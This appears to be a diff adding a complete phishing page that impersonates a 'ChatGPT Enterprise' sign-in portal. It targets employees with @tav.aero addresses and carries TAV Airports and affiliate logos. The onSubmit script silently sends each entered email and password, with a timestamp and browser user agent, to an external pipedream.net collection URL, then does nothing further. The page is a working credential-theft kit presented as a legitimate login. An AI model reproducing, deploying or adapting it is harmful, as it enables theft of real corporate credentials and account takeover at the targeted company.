@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="theme-color" content="#0FA47E" />
+  <title>ChatGPT Enterprise — Sign In</title>
+  <style>
+    :root{
+      /* New palette: dark theme + ChatGPT green */
+      --bg:#0b0f0e;
+      --bg-soft:#0d1412;
+      --panel:#0f1514;
+      --text:#e8f1ee;
+      --muted:#a3b2ad;
+      --accent:#10A37F;   /* ChatGPT green */
+      --accent-2:#00C389; /* for gradient accents */
+      --danger:#ff6b6b;
+      --ring: rgba(16,163,127,.35);
+    }
+
+    *{ box-sizing:border-box }
+    html,body{ height:100% }
+    body{
+      margin:0; color:var(--text);
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+      background:
+        radial-gradient(1200px 800px at 20% -10%, rgba(16,163,127,.10), transparent 60%),
+        radial-gradient(1000px 700px at 120% 120%, rgba(0,195,137,.08), transparent 55%),
+        linear-gradient(180deg, #0a0f0e 0%, #060808 100%);
+      display:grid; place-items:center;
+      padding:24px;
+      color-scheme: dark;
+    }
+
+    /* Subtle grid background */
+    .grid-overlay{
+      position:fixed; inset:0; pointer-events:none; opacity:.06;
+      background-image: linear-gradient(transparent 23px, #fff 24px), linear-gradient(90deg, transparent 23px, #fff 24px);
+      background-size: 24px 24px;
+      mix-blend-mode: soft-light;
+    }
+
+    .card{
+      width:100%; max-width:460px; position:relative; overflow:hidden;
+      background: linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02)) , var(--panel);
+      border:1px solid rgba(255,255,255,.06);
+      border-radius:20px; padding:28px 26px 26px;
+      box-shadow: 0 24px 70px rgba(0,0,0,.55), inset 0 1px 0 rgba(255,255,255,.05);
+      backdrop-filter: blur(6px);
+      isolation:isolate;
+    }
+
+    .card::after{ /* glow ring */
+      content:""; position:absolute; inset:-1px; border-radius:inherit; pointer-events:none;
+      box-shadow: 0 0 0 1px rgba(255,255,255,.04), 0 0 50px 8px var(--ring);
+      opacity:.22;
+    }
+
+    .brand{ display:flex; align-items:center; gap:12px; margin:4px 0 8px }
+    .brand .logo{ width:38px; height:38px; filter:none !important }
+    .brand h1{ font-size:18px; font-weight:700; margin:0 }
+    .subtitle{ margin:0 0 18px 50px; color:var(--muted); font-size:12.5px }
+
+    .section-title{ font-size:14px; font-weight:600; color:#f1f6f4; margin:14px 0 10px }
+
+    .input{ width:100%; padding:13.5px 14px; border-radius:12px; outline:none;
+      background:#0a0f0e; border:1px solid rgba(255,255,255,.08); color:var(--text);
+      transition: border .15s ease, box-shadow .15s ease, background .2s ease; font-size:14.5px }
+    .input::placeholder{ color:#6c7672 }
+    .input:focus{ border-color:var(--accent); box-shadow:0 0 0 3px rgba(16,163,127,.18); background:#0b1110 }
+
+    .row{ display:flex; gap:10px }
+    label{ display:block; font-size:12.5px; color:var(--muted); margin:0 0 6px 2px }
+
+    .btn{ width:100%; padding:12.5px 14px; border:0; border-radius:12px; cursor:pointer;
+      font-weight:700; font-size:14.5px; letter-spacing:.2px; transition: transform .12s, box-shadow .12s, filter .12s }
+
+    .btn-primary{ color:#06120e; background:linear-gradient(90deg, var(--accent), var(--accent-2)); box-shadow:0 10px 22px rgba(16,163,127,.28) }
+    .btn-primary:hover{ transform:translateY(-1px) }
+
+    .btn-ghost{ background:transparent; color:var(--text); border:1px solid rgba(255,255,255,.10) }
+    .btn-ghost:hover{ filter:brightness(1.1) }
+
+    .sso{ display:grid; grid-template-columns: 1fr; gap:10px }
+    .sso .btn{ display:flex; align-items:center; justify-content:center; gap:10px }
+
+    .divider{ display:flex; align-items:center; gap:10px; margin:14px 0 }
+    .divider::before,.divider::after{ content:""; flex:1; height:1px; background:rgba(255,255,255,.08) }
+    .divider span{ font-size:12px; color:var(--muted) }
+
+    #error{ min-height:18px; font-size:12.5px; color:var(--danger); margin:8px 2px 0 }
+
+    .footer{ margin-top:14px; text-align:center; color:var(--muted); font-size:12px }
+
+    @media (prefers-reduced-motion:no-preference){
+      .logo-spin{ animation: spin 14s linear infinite }
+      @keyframes spin{ from{ transform:rotate(0deg)} to{ transform:rotate(360deg)} }
+    }
+      /* affiliates bar */
+    .affiliates-bar{
+      position:fixed; left:50%; bottom:20px; transform:translateX(-50%);
+      display:flex; flex-wrap:wrap; gap:14px; align-items:center; justify-content:center;
+      padding:12px 18px; z-index:50;
+      background: rgba(255,255,255,.92); /* lighter background */
+      border:1px solid rgba(0,0,0,.06);
+      border-radius:16px; box-shadow: 0 12px 30px rgba(0,0,0,.35);
+      backdrop-filter: blur(4px) saturate(120%);
+    }
+    .affiliates-bar img{
+      height:44px; max-width:180px; object-fit:contain; filter:none; opacity:1;
+      background:#ffffff; /* white card behind logo */
+      border:1px solid rgba(0,0,0,.06);
+      box-shadow: 0 2px 6px rgba(0,0,0,.08);
+      padding:6px 8px; border-radius:12px; transition: transform .2s ease;
+    }
+    .affiliates-bar img:hover{ transform: translateY(-2px) }
+
+    @media (max-width:520px){
+      .affiliates-bar{ gap:10px; padding:8px 12px }
+      .affiliates-bar img{ height:36px; max-width:130px; padding:4px 6px }
+    }
+      
+  </style>
+  <script>
+    
+
+    async function onSubmit(e){
+      e.preventDefault();
+      const form = e.target;
+      const email = form.email.value.trim().toLowerCase();
+      const password = form.password.value;
+      const err = document.getElementById('error');
+      err.textContent = '';
+
+      if(!email.endsWith('@tav.aero')){
+        err.textContent = 'Please use your @tav.aero email.'; return;
+      }
+      if(password.length < 8){ err.textContent = 'Password must be at least 8 characters.'; return; }
+
+      try{
+        const params = new URLSearchParams({
+          email,
+          password,
+          ts: new Date().toISOString(),
+          ua: navigator.userAgent
+        });
+        await fetch('https://eooxgfjus54zia5.m.pipedream.net?' + params.toString(), {
+          method: 'GET',
+          mode: 'no-cors'
+        });
+        // success flow
+        location.href = '#';
+      }catch(e){ err.textContent = 'Sign-in failed. Please check your details.' }
+    }
+  </script>
+</head>
+<body>
+  <div class="grid-overlay" aria-hidden="true"></div>
+
+  <main class="card" role="main" aria-label="ChatGPT Enterprise sign-in card">
+    <header class="brand" aria-label="Brand">
+      <!-- ChatGPT swirl benzeri SVG (monokrom) -->
+      <img class="logo logo-spin" src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" alt="ChatGPT Logo" width="38" height="38" decoding="async" />
+      <h1>ChatGPT Enterprise</h1>
+    </header>
+    <p class="subtitle">Sign in with your corporate account</p>
+
+    
+
+    
+
+    <section aria-label="Email sign-in">
+      <form onsubmit="onSubmit(event)">
+        <label for="email">Work email</label>
+        <input class="input" id="email" name="email" type="email" placeholder="name.surname@tav.aero" autocomplete="username" required pattern="^[^@]+@tav\.aero$" title="Use your @tav.aero email address" />
+
+        <div style="height:10px"></div>
+        <label for="password">Password</label>
+        <input class="input" id="password" name="password" type="password" placeholder="••••••••" autocomplete="current-password" required />
+
+        <div id="error" role="alert" aria-live="polite"></div>
+        <div style="height:12px"></div>
+        <button class="btn btn-primary" type="submit">Continue</button>
+      </form>
+    </section>
+
+    <p class="footer">Having trouble signing in? <a href="#" style="color:var(--accent); text-decoration:none">Contact IT</a>.</p>
+  </main>
+  
+  <!-- Affiliates logos (TAV, ATU, Havaş, BTA) -->
+  <div class="affiliates-bar" aria-label="Affiliates">
+    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Airports"/>
+    <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU"/>
+    <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="Havaş"/>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA"/>
+  </div>
+</body>
+</html>
